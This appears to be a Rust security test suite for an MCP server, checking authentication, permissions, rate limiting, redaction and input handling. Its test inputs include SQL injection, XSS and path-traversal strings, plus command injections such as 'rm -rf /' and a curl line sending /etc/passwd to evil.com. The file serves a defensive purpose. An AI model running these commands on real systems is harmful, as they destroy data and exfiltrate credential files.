// ABOUTME: Security-focused tests for Fortitude MCP server
// Tests authentication, authorization, input validation, and security boundaries
// Validates protection against common security threats

#![allow(clippy::uninlined_format_args, clippy::manual_abs_diff)]

mod common;

use common::*;
use fortitude_mcp_server::{
    AuthManager, AuthMiddleware, FortitudeTools, Permission, ResourceProvider,
};
use std::sync::Arc;

/// Test comprehensive input validation and sanitization
#[tokio::test]
async fn test_input_validation_security() {
    let env = TestEnvironment::new().await.unwrap();
    let tools = FortitudeTools::new(env.config.as_ref().clone())
        .await
        .unwrap();

    // Test 1: SQL injection attempts
    let sql_injections = vec![
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; DELETE FROM data; --",
        "' UNION SELECT * FROM passwords --",
        "admin'; DROP DATABASE production; --",
    ];

    for injection in sql_injections {
        let request = TestDataBuilder::research_query_request(injection);
        let result = tools.call_tool(request).await;

        // Should either sanitize and process safely, or reject
        if let Ok(response) = result {
            assert_eq!(response.is_error, Some(false));

            // Verify response doesn't contain dangerous SQL
            if let Some(content) = response.content[0].as_text() {
                assert!(
                    !content.text.contains("DROP TABLE"),
                    "Response should not contain SQL injection"
                );
                assert!(
                    !content.text.contains("DELETE FROM"),
                    "Response should not contain SQL injection"
                );
            }
        }
    }

    // Test 2: XSS attempts
    let xss_attempts = vec![
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<svg onload=alert('xss')>",
        "data:text/html,<script>alert('xss')</script>",
        "<iframe src=javascript:alert('xss')></iframe>",
    ];

    for xss in xss_attempts {
        let request = TestDataBuilder::research_query_request(xss);
        let result = tools.call_tool(request).await;

        // Should either sanitize and process safely, or reject
        if let Ok(response) = result {
            assert_eq!(response.is_error, Some(false));

            // Verify response doesn't contain unsanitized script tags
            if let Some(content) = response.content[0].as_text() {
                assert!(
                    !content.text.contains("<script>"),
                    "Response should not contain script tags"
                );
                assert!(
                    !content.text.contains("javascript:"),
                    "Response should not contain javascript: URLs"
                );
                assert!(
                    !content.text.contains("onerror="),
                    "Response should not contain event handlers"
                );
            }
        }
    }

    // Test 3: Command injection attempts
    let command_injections = vec![
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& wget malicious.com/script.sh",
        "; curl -d @/etc/passwd evil.com",
        "$(rm -rf /)",
        "`cat /etc/passwd`",
    ];

    for injection in command_injections {
        let request = TestDataBuilder::research_query_request(injection);
        let result = tools.call_tool(request).await;

        // Should handle safely
        if let Ok(response) = result {
            assert_eq!(response.is_error, Some(false));
        }
    }

    // Test 4: Path traversal in queries
    let path_traversals = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc//passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ];

    for traversal in path_traversals {
        let request = TestDataBuilder::research_query_request(traversal);
        let result = tools.call_tool(request).await;

        // Should handle safely
        if let Ok(response) = result {
            assert_eq!(response.is_error, Some(false));
        }
    }

    // Test 5: Control character injection
    let control_chars = vec![
        "test\x00injection",
        "test\x01\x02\x03chars",
        "test\x7f\u{80}\u{81}chars",
        "test\u{feff}bom",
        "test\u{200b}zero-width",
    ];

    for control_char in control_chars {
        let request = TestDataBuilder::research_query_request(control_char);
        let result = tools.call_tool(request).await;

        // Should handle safely by sanitizing or rejecting
        if let Ok(response) = result {
            assert_eq!(response.is_error, Some(false));

            // Verify control characters are removed
            if let Some(content) = response.content[0].as_text() {
                assert!(
                    !content.text.contains('\x00'),
                    "Response should not contain null bytes"
                );
                assert!(
                    !content.text.contains('\x01'),
                    "Response should not contain control chars"
                );
            }
        }
    }
}

/// Test authentication security
#[tokio::test]
async fn test_authentication_security() {
    let env = TestEnvironment::new().await.unwrap();
    let auth_manager = env.auth_manager.clone();
    let auth_middleware = AuthMiddleware::new(auth_manager.clone());

    // Test 1: Token tampering resistance
    let valid_token = auth_manager
        .generate_token("test_user", vec![Permission::ResearchRead])
        .await
        .unwrap();

    let tampering_attempts = vec![
        format!("{}extra", valid_token),
        format!("modified{}", valid_token),
        valid_token.replace('A', "B"),
        valid_token.chars().rev().collect::<String>(),
        format!("Bearer {}", valid_token).replace("Bearer ", ""),
    ];

    for tampered_token in tampering_attempts {
        let result = auth_middleware
            .authenticate_request(
                Some(&format!("Bearer {}", tampered_token)),
                "test_client",
                Permission::ResearchRead,
            )
            .await;
        assert!(result.is_err(), "Should reject tampered token");
    }

    // Test 2: Timing attack resistance
    let invalid_tokens = vec![
        "invalid_token_1".to_string(),
        "invalid_token_2".to_string(),
        "invalid_token_3".to_string(),
        "a".repeat(100),
        "b".repeat(200),
        "c".repeat(300),
    ];

    let mut timings = Vec::new();

    for token in invalid_tokens {
        let start = std::time::Instant::now();
        let result = auth_middleware
            .authenticate_request(
                Some(&format!("Bearer {}", token)),
                "test_client",
                Permission::ResearchRead,
            )
            .await;
        let duration = start.elapsed();

        assert!(result.is_err());
        timings.push(duration);
    }

    // Verify timing consistency (within reasonable bounds)
    let avg_timing = timings.iter().sum::<std::time::Duration>() / timings.len() as u32;
    for timing in &timings {
        let diff = if *timing > avg_timing {
            *timing - avg_timing
        } else {
            avg_timing - *timing
        };
        assert!(
            diff < std::time::Duration::from_millis(100),
            "Timing difference should be < 100ms to prevent timing attacks"
        );
    }

    // Test 3: Replay attack prevention
    let token = auth_manager
        .generate_token("test_user", vec![Permission::ResearchRead])
        .await
        .unwrap();
    let auth_header = format!("Bearer {}", token);

    // First request should succeed
    let result1 = auth_middleware
        .authenticate_request(
            Some(&auth_header),
            "replay_test_client",
            Permission::ResearchRead,
        )
        .await;
    assert!(result1.is_ok());

    // Subsequent requests with same token should also succeed (tokens are reusable until expiry)
    let result2 = auth_middleware
        .authenticate_request(
            Some(&auth_header),
            "replay_test_client",
            Permission::ResearchRead,
        )
        .await;
    assert!(result2.is_ok());

    // Test 4: Token expiration security
    let short_lived_token = {
        let mut config = env.config.as_ref().clone();
        config.auth.token_expiration_hours = 1;
        let short_auth = AuthManager::new(Arc::new(config)).unwrap();
        short_auth
            .generate_token("test_user", vec![Permission::ResearchRead])
            .await
            .unwrap()
    };

    // Token should be valid now
    let result = auth_middleware
        .authenticate_request(
            Some(&format!("Bearer {}", short_lived_token)),
            "test_client",
            Permission::ResearchRead,
        )
        .await;
    assert!(result.is_ok());

    // Test 5: Permission boundary enforcement
    let limited_token = auth_manager
        .generate_token("limited_user", vec![Permission::ResearchRead])
        .await
        .unwrap();
    let limited_header = format!("Bearer {}", limited_token);

    // Should have research permission
    let result = auth_middleware
        .authenticate_request(
            Some(&limited_header),
            "test_client",
            Permission::ResearchRead,
        )
        .await;
    assert!(result.is_ok());

    // Should not have admin permission
    let result = auth_middleware
        .authenticate_request(Some(&limited_header), "test_client", Permission::Admin)
        .await;
    assert!(result.is_err());

    // Should not have config permission
    let result = auth_middleware
        .authenticate_request(Some(&limited_header), "test_client", Permission::ConfigRead)
        .await;
    assert!(result.is_err());
}

/// Test authorization security
#[tokio::test]
async fn test_authorization_security() {
    let env = TestEnvironment::new().await.unwrap();
    let auth_manager = env.auth_manager.clone();
    let auth_middleware = AuthMiddleware::new(auth_manager.clone());

    // Test 1: Privilege escalation prevention
    let user_permissions = vec![
        vec![Permission::ResearchRead],
        vec![Permission::ResourcesRead],
        vec![Permission::ConfigRead],
        vec![Permission::ResearchRead, Permission::ResourcesRead],
    ];

    for permissions in user_permissions {
        let token = auth_manager
            .generate_token("test_user", permissions.clone())
            .await
            .unwrap();
        let auth_header = format!("Bearer {}", token);

        // User should only have their granted permissions
        for granted_permission in &permissions {
            let result = auth_middleware
                .authenticate_request(Some(&auth_header), "test_client", *granted_permission)
                .await;
            assert!(
                result.is_ok(),
                "Should have granted permission: {:?}",
                granted_permission
            );
        }

        // User should not have admin permission (unless explicitly granted)
        if !permissions.contains(&Permission::Admin) {
            let result = auth_middleware
                .authenticate_request(Some(&auth_header), "test_client", Permission::Admin)
                .await;
            assert!(result.is_err(), "Should not have admin permission");
        }
    }

    // Test 2: Admin permission verification
    let admin_token = auth_manager.create_default_admin_token().await.unwrap();
    let admin_header = format!("Bearer {}", admin_token);

    // Admin should have all permissions
    for permission in Permission::all() {
        let result = auth_middleware
            .authenticate_request(Some(&admin_header), "admin_client", permission)
            .await;
        assert!(
            result.is_ok(),
            "Admin should have all permissions: {:?}",
            permission
        );
    }

    // Test 3: Cross-user permission isolation
    let user1_token = auth_manager
        .generate_token("user1", vec![Permission::ResearchRead])
        .await
        .unwrap();
    let user2_token = auth_manager
        .generate_token("user2", vec![Permission::ResourcesRead])
        .await
        .unwrap();

    // User1 should only have research permission
    let result = auth_middleware
        .authenticate_request(
            Some(&format!("Bearer {}", user1_token)),
            "user1_client",
            Permission::ResearchRead,
        )
        .await;
    assert!(result.is_ok());

    let result = auth_middleware
        .authenticate_request(
            Some(&format!("Bearer {}", user1_token)),
            "user1_client",
            Permission::ResourcesRead,
        )
        .await;
    assert!(result.is_err());

    // User2 should only have resources permission
    let result = auth_middleware
        .authenticate_request(
            Some(&format!("Bearer {}", user2_token)),
            "user2_client",
            Permission::ResourcesRead,
        )
        .await;
    assert!(result.is_ok());

    let result = auth_middleware
        .authenticate_request(
            Some(&format!("Bearer {}", user2_token)),
            "user2_client",
            Permission::ResearchRead,
        )
        .await;
    assert!(result.is_err());
}

/// Test resource access security
#[tokio::test]
async fn test_resource_access_security() {
    let env = TestEnvironment::new().await.unwrap();
    let resources = ResourceProvider::new(env.config.clone());

    // Test 1: Path traversal protection
    let path_traversal_attempts = SecurityTestHelper::generate_path_traversal_attempts();

    for traversal in path_traversal_attempts {
        let malicious_uri = format!("mcp://fortitude/docs/{}", traversal);
        let result = resources.read_resource(&malicious_uri).await;
        assert!(
            result.is_err(),
            "Should reject path traversal: {}",
            malicious_uri
        );
    }

    // Test 2: URI scheme validation
    let invalid_schemes = vec![
        "http://fortitude/docs/test",
        "https://fortitude/docs/test",
        "file:///etc/passwd",
        "ftp://fortitude/docs/test",
        "data:text/plain,malicious",
        "javascript:alert('xss')",
    ];

    for scheme in invalid_schemes {
        let result = resources.read_resource(scheme).await;
        assert!(result.is_err(), "Should reject invalid scheme: {}", scheme);
    }

    // Test 3: Domain validation
    let invalid_domains = vec![
        "mcp://evil.com/docs/test",
        "mcp://attacker/docs/test",
        "mcp://fortitude.evil.com/docs/test",
        "mcp://sub.fortitude/docs/test",
    ];

    for domain in invalid_domains {
        let result = resources.read_resource(domain).await;
        assert!(result.is_err(), "Should reject invalid domain: {}", domain);
    }

    // Test 4: Resource type validation
    let invalid_resource_types = vec![
        "mcp://fortitude/admin/secrets",
        "mcp://fortitude/private/keys",
        "mcp://fortitude/internal/config",
        "mcp://fortitude/debug/logs",
    ];

    for resource_type in invalid_resource_types {
        let result = resources.read_resource(resource_type).await;
        assert!(
            result.is_err(),
            "Should reject invalid resource type: {}",
            resource_type
        );
    }

    // Test 5: Configuration sanitization
    let config_uri = "mcp://fortitude/config/current";
    let result = resources.read_resource(config_uri).await.unwrap();

    if let rmcp::model::ResourceContents::TextResourceContents { text, .. } = &result[0] {
        let config: serde_json::Value = serde_json::from_str(text).unwrap();

        // Verify sensitive fields are redacted
        assert_eq!(config["auth"]["jwt_secret"], "[REDACTED]");

        // Verify no sensitive data is exposed
        assert!(!text.contains("password"));
        assert!(!text.contains("secret"));
        assert!(!text.contains("key"));
    }

    // Test 6: Directory listing protection
    let directory_uris = vec![
        "mcp://fortitude/docs/",
        "mcp://fortitude/docs/reference_library/",
        "mcp://fortitude/",
    ];

    for uri in directory_uris {
        let result = resources.read_resource(uri).await;
        assert!(
            result.is_err(),
            "Should not allow directory listing: {}",
            uri
        );
    }
}

/// Test rate limiting security
#[tokio::test]
async fn test_rate_limiting_security() {
    let env = TestEnvironment::new().await.unwrap();
    let mut auth_manager = AuthManager::new(env.config.clone()).unwrap();

    // Set strict rate limiting
    auth_manager.set_rate_limit_config(fortitude_mcp_server::RateLimitConfig {
        max_requests_per_minute: 5,
        window_seconds: 60,
    });

    let auth_manager = Arc::new(auth_manager);
    let auth_middleware = AuthMiddleware::new(auth_manager.clone());

    // Test 1: Basic rate limiting
    let token = auth_manager
        .generate_token("rate_test_user", vec![Permission::ResearchRead])
        .await
        .unwrap();
    let auth_header = format!("Bearer {}", token);

    // First 5 requests should succeed
    for i in 0..5 {
        let result = auth_middleware
            .authenticate_request(
                Some(&auth_header),
                "rate_test_client",
                Permission::ResearchRead,
            )
            .await;
        assert!(result.is_ok(), "Request {} should succeed", i);
    }

    // 6th request should fail
    let result = auth_middleware
        .authenticate_request(
            Some(&auth_header),
            "rate_test_client",
            Permission::ResearchRead,
        )
        .await;
    assert!(result.is_err(), "Should be rate limited");

    // Test 2: Per-client isolation
    let result = auth_middleware
        .authenticate_request(
            Some(&auth_header),
            "different_client",
            Permission::ResearchRead,
        )
        .await;
    assert!(
        result.is_ok(),
        "Different client should not be rate limited"
    );

    // Test 3: Rate limit bypass attempts
    let bypass_attempts = vec![
        "rate_test_client",
        "rate_test_client ",
        "RATE_TEST_CLIENT",
        "rate_test_client\x00",
        "rate_test_client\n",
    ];

    for client_id in bypass_attempts {
        let result = auth_middleware
            .authenticate_request(Some(&auth_header), client_id, Permission::ResearchRead)
            .await;
        // Should either be rate limited or handle safely
        if client_id == "rate_test_client" {
            assert!(result.is_err(), "Should still be rate limited");
        }
    }

    // Test 4: DoS protection
    let mut concurrent_handles = Vec::new();

    for i in 0..20 {
        let auth_manager_clone = auth_manager.clone();
        let auth_header = auth_header.clone();
        let client_id = format!("dos_client_{}", i);

        let handle = tokio::spawn(async move {
            let middleware = AuthMiddleware::new(auth_manager_clone);
            middleware
                .authenticate_request(Some(&auth_header), &client_id, Permission::ResearchRead)
                .await
        });

        concurrent_handles.push(handle);
    }

    let results = futures::future::join_all(concurrent_handles).await;

    // Should handle concurrent requests gracefully
    let successful_requests = results
        .iter()
        .filter(|r| r.is_ok() && r.as_ref().unwrap().is_ok())
        .count();

    // Should allow some requests but not all due to rate limiting
    assert!(successful_requests > 0, "Should allow some requests");
    assert!(successful_requests < 20, "Should rate limit some requests");
}

/// Test session security
#[tokio::test]
async fn test_session_security() {
    let env = TestEnvironment::new().await.unwrap();
    let auth_manager = env.auth_manager.clone();
    let auth_middleware = AuthMiddleware::new(auth_manager.clone());

    // Test 1: Session fixation prevention
    let user_token1 = auth_manager
        .generate_token("test_user", vec![Permission::ResearchRead])
        .await
        .unwrap();
    let user_token2 = auth_manager
        .generate_token("test_user", vec![Permission::ResearchRead])
        .await
        .unwrap();

    // Different tokens should be generated for the same user
    assert_ne!(
        user_token1, user_token2,
        "Should generate different tokens for same user"
    );

    // Both should be valid
    let result1 = auth_middleware
        .authenticate_request(
            Some(&format!("Bearer {}", user_token1)),
            "test_client1",
            Permission::ResearchRead,
        )
        .await;
    assert!(result1.is_ok());

    let result2 = auth_middleware
        .authenticate_request(
            Some(&format!("Bearer {}", user_token2)),
            "test_client2",
            Permission::ResearchRead,
        )
        .await;
    assert!(result2.is_ok());

    // Test 2: Token uniqueness
    let mut tokens = Vec::new();
    for i in 0..10 {
        let token = auth_manager
            .generate_token(&format!("user_{}", i), vec![Permission::ResearchRead])
            .await
            .unwrap();
        tokens.push(token);
    }

    // All tokens should be unique
    for i in 0..tokens.len() {
        for j in i + 1..tokens.len() {
            assert_ne!(tokens[i], tokens[j], "All tokens should be unique");
        }
    }

    // Test 3: Token information leakage prevention
    let token = auth_manager
        .generate_token("test_user", vec![Permission::ResearchRead])
        .await
        .unwrap();

    // Token should not contain readable user information
    assert!(
        !token.contains("test_user"),
        "Token should not contain readable user info"
    );
    assert!(
        !token.contains("research"),
        "Token should not contain readable permission info"
    );

    // Test 4: JWT claims validation
    let claims = auth_manager.verify_token(&token).await.unwrap();

    // Claims should have proper structure
    assert!(!claims.sub.is_empty(), "Subject should not be empty");
    assert!(!claims.iss.is_empty(), "Issuer should not be empty");
    assert!(
        claims.exp > chrono::Utc::now().timestamp(),
        "Token should not be expired"
    );
    assert!(
        claims.iat <= chrono::Utc::now().timestamp(),
        "Issued at should be valid"
    );

    // Test 5: Concurrent session security
    let concurrent_sessions = 10;
    let mut session_handles = Vec::new();

    for i in 0..concurrent_sessions {
        let auth_manager_clone = auth_manager.clone();

        let handle = tokio::spawn(async move {
            let token = auth_manager_clone
                .generate_token(
                    &format!("concurrent_user_{}", i),
                    vec![Permission::ResearchRead],
                )
                .await
                .unwrap();
            let auth_header = format!("Bearer {}", token);
            let middleware = AuthMiddleware::new(auth_manager_clone);

            middleware
                .authenticate_request(
                    Some(&auth_header),
                    &format!("concurrent_client_{}", i),
                    Permission::ResearchRead,
                )
                .await
        });

        session_handles.push(handle);
    }

    let session_results = futures::future::join_all(session_handles).await;

    // All concurrent sessions should work
    for result in session_results {
        assert!(result.is_ok());
        assert!(result.unwrap().is_ok());
    }
}

/// Test cryptographic security
#[tokio::test]
async fn test_cryptographic_security() {
    let env = TestEnvironment::new().await.unwrap();
    let auth_manager = env.auth_manager.clone();

    // Test 1: JWT signature verification
    let token = auth_manager
        .generate_token("test_user", vec![Permission::ResearchRead])
        .await
        .unwrap();

    // Valid token should verify
    let result = auth_manager.verify_token(&token).await;
    assert!(result.is_ok(), "Valid token should verify");

    // Tampered token should fail
    let tampered_token = if token.ends_with('A') {
        token.replace('A', "B")
    } else {
        format!("{}A", token)
    };

    let result = auth_manager.verify_token(&tampered_token).await;
    assert!(result.is_err(), "Tampered token should fail verification");

    // Test 2: Token entropy
    let mut tokens = Vec::new();
    for i in 0..10 {
        let token = auth_manager
            .generate_token(&format!("user_{}", i), vec![Permission::ResearchRead])
            .await
            .unwrap();
        tokens.push(token);
    }

    // Tokens should have sufficient entropy (all different)
    for i in 0..tokens.len() {
        for j in i + 1..tokens.len() {
            assert_ne!(tokens[i], tokens[j], "Tokens should have high entropy");
        }
    }

    // Test 3: Algorithm security
    let claims = auth_manager.verify_token(&token).await.unwrap();

    // Should use secure issuer
    assert_eq!(claims.iss, "fortitude-mcp-server");

    // Test 4: Secret key validation
    let weak_secret_config = {
        let mut config = env.config.as_ref().clone();
        config.auth.jwt_secret = "weak".to_string();
        config.auth.enabled = true;
        Arc::new(config)
    };

    // Should reject weak secret in validation
    let result = weak_secret_config.validate();
    assert!(result.is_err(), "Should reject weak JWT secret");
}

/// Test information disclosure prevention
#[tokio::test]
async fn test_information_disclosure_prevention() {
    let env = TestEnvironment::new().await.unwrap();
    let tools = FortitudeTools::new(env.config.as_ref().clone())
        .await
        .unwrap();
    let resources = ResourceProvider::new(env.config.clone());

    // Test 1: Error message sanitization
    let error_inducing_requests = vec![
        TestDataBuilder::invalid_tool_request("nonexistent_tool"),
        TestDataBuilder::malformed_request("research_query"),
        TestDataBuilder::empty_query_request(),
    ];

    for request in error_inducing_requests {
        let result = tools.call_tool(request).await;
        assert!(result.is_err());

        let error_msg = result.unwrap_err().to_string();

        // Should not expose sensitive information
        assert!(!error_msg.contains("password"));
        assert!(!error_msg.contains("secret"));
        assert!(!error_msg.contains("key"));
        assert!(!error_msg.contains("token"));
        assert!(!error_msg.to_lowercase().contains("internal"));
        assert!(!error_msg.contains("/home/"));
        assert!(!error_msg.contains("C:\\"));
    }

    // Test 2: Resource access information disclosure
    let invalid_resource_uris = vec![
        "mcp://fortitude/docs/../../../etc/passwd",
        "mcp://fortitude/nonexistent/resource",
        "mcp://fortitude/invalid/path",
    ];

    for uri in invalid_resource_uris {
        let result = resources.read_resource(uri).await;
        assert!(result.is_err());

        let error_msg = result.unwrap_err().to_string();

        // Should not expose file system paths
        assert!(!error_msg.contains("/etc/passwd"));
        assert!(!error_msg.contains("../"));
        assert!(!error_msg.contains("../../"));
        assert!(!error_msg.contains("file not found"));
    }

    // Test 3: Configuration information disclosure
    let config_uri = "mcp://fortitude/config/current";
    let result = resources.read_resource(config_uri).await.unwrap();

    if let rmcp::model::ResourceContents::TextResourceContents { text, .. } = &result[0] {
        // Should not contain sensitive configuration
        assert!(!text.contains("password"));
        assert!(!text.contains("secret"));
        assert!(!text.contains("key"));
        assert!(text.contains("[REDACTED]"));
    }

    // Test 4: System information disclosure
    let system_uri = "mcp://fortitude/system/metrics";
    let result = resources.read_resource(system_uri).await.unwrap();

    if let rmcp::model::ResourceContents::TextResourceContents { text, .. } = &result[0] {
        let _metrics: serde_json::Value = serde_json::from_str(text).unwrap();

        // Should not contain sensitive system information
        assert!(!text.contains("password"));
        assert!(!text.contains("secret"));
        assert!(!text.contains("key"));

        // Should not expose detailed system paths
        assert!(!text.contains("/home/"));
        assert!(!text.contains("/etc/"));
        assert!(!text.contains("C:\\"));
    }
}

/// Test security boundary enforcement
#[tokio::test]
async fn test_security_boundary_enforcement() {
    let env = TestEnvironment::new().await.unwrap();
    let tools = FortitudeTools::new(env.config.as_ref().clone())
        .await
        .unwrap();
    let resources = ResourceProvider::new(env.config.clone());
    let auth_manager = env.auth_manager.clone();

    // Test 1: Component isolation
    // Tool errors should not affect resource access
    let _ = tools
        .call_tool(TestDataBuilder::invalid_tool_request("invalid"))
        .await;

    let resource_result = resources
        .read_resource("mcp://fortitude/cache/statistics")
        .await;
    assert!(
        resource_result.is_ok(),
        "Resource access should be isolated from tool errors"
    );

    // Test 2: User isolation
    let user1_token = auth_manager
        .generate_token("user1", vec![Permission::ResearchRead])
        .await
        .unwrap();
    let _user2_token = auth_manager
        .generate_token("user2", vec![Permission::ResourcesRead])
        .await
        .unwrap();

    // User 1 should not be able to access user 2's permissions
    let auth_middleware = AuthMiddleware::new(auth_manager.clone());

    let result = auth_middleware
        .authenticate_request(
            Some(&format!("Bearer {}", user1_token)),
            "user1_client",
            Permission::ResourcesRead,
        )
        .await;
    assert!(
        result.is_err(),
        "User 1 should not have user 2's permissions"
    );

    // Test 3: Resource type boundary enforcement
    let restricted_resources = vec![
        "mcp://fortitude/admin/secrets",
        "mcp://fortitude/internal/config",
        "mcp://fortitude/debug/logs",
    ];

    for resource in restricted_resources {
        let result = resources.read_resource(resource).await;
        assert!(
            result.is_err(),
            "Should not allow access to restricted resource: {}",
            resource
        );
    }

    // Test 4: Input validation boundary
    let dangerous_inputs = vec![
        "\x00\x01\x02\x03",
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
    ];

    for input in dangerous_inputs {
        let request = TestDataBuilder::research_query_request(input);
        let result = tools.call_tool(request).await;

        // Should either sanitize or reject, but not crash
        if let Ok(response) = result {
            // If accepted, should be sanitized
            assert_eq!(response.is_error, Some(false));
        }
        // If rejected, that's also acceptable
    }
}

/// Test comprehensive security under load
#[tokio::test]
async fn test_security_under_load() {
    let env = TestEnvironment::new().await.unwrap();
    let tools = Arc::new(
        FortitudeTools::new(env.config.as_ref().clone())
            .await
            .unwrap(),
    );
    let resources = Arc::new(ResourceProvider::new(env.config.clone()));
    let auth_manager = env.auth_manager.clone();

    // Test 1: Security under concurrent malicious requests
    let malicious_requests = 20;
    let mut handles = Vec::new();

    for i in 0..malicious_requests {
        let tools = tools.clone();
        let resources = resources.clone();

        let handle = tokio::spawn(async move {
            let attack_type = i % 4;

            match attack_type {
                0 => {
                    // SQL injection attempt
                    let request =
                        TestDataBuilder::research_query_request("'; DROP TABLE users; --");
                    tools.call_tool(request).await
                }
                1 => {
                    // XSS attempt
                    let request =
                        TestDataBuilder::research_query_request("<script>alert('xss')</script>");
                    tools.call_tool(request).await
                }
                2 => {
                    // Path traversal attempt
                    let uri = "mcp://fortitude/docs/../../../etc/passwd";
                    match resources.read_resource(uri).await {
                        Ok(_) => Err(rmcp::Error::invalid_request(
                            "Should not allow path traversal".to_string(),
                            None,
                        )),
                        Err(_) => Ok(rmcp::model::CallToolResult::success(vec![])), // Expected failure
                    }
                }
                3 => {
                    // Command injection attempt
                    let request = TestDataBuilder::research_query_request("; rm -rf /");
                    tools.call_tool(request).await
                }
                _ => unreachable!(),
            }
        });

        handles.push(handle);
    }

    let results = futures::future::join_all(handles).await;

    // All malicious requests should be handled safely
    for result in results {
        assert!(
            result.is_ok(),
            "Malicious request handling should not crash"
        );
    }

    // Test 2: System should remain functional after attack
    let legitimate_request =
        TestDataBuilder::research_query_request("Legitimate query after attacks");
    let result = tools.call_tool(legitimate_request).await;
    assert!(
        result.is_ok(),
        "System should remain functional after attacks"
    );

    let legitimate_resource = resources
        .read_resource("mcp://fortitude/cache/statistics")
        .await;
    assert!(
        legitimate_resource.is_ok(),
        "Resource access should work after attacks"
    );

    // Test 3: Authentication should remain secure under load
    let concurrent_auth_attempts = 10;
    let mut auth_handles = Vec::new();

    for i in 0..concurrent_auth_attempts {
        let auth_manager = auth_manager.clone();

        let handle = tokio::spawn(async move {
            // Mix of valid and invalid auth attempts
            if i % 2 == 0 {
                let token = auth_manager
                    .generate_token(&format!("user_{}", i), vec![Permission::ResearchRead])
                    .await
                    .unwrap();
                auth_manager.verify_token(&token).await
            } else {
                auth_manager.verify_token("invalid_token").await
            }
        });

        auth_handles.push(handle);
    }

    let auth_results = futures::future::join_all(auth_handles).await;

    // Valid tokens should verify, invalid should fail
    for (i, result) in auth_results.iter().enumerate() {
        assert!(result.is_ok(), "Auth attempt should not crash");

        let auth_result = result.as_ref().unwrap();
        if i % 2 == 0 {
            assert!(auth_result.is_ok(), "Valid token should verify");
        } else {
            assert!(auth_result.is_err(), "Invalid token should fail");
        }
    }
}
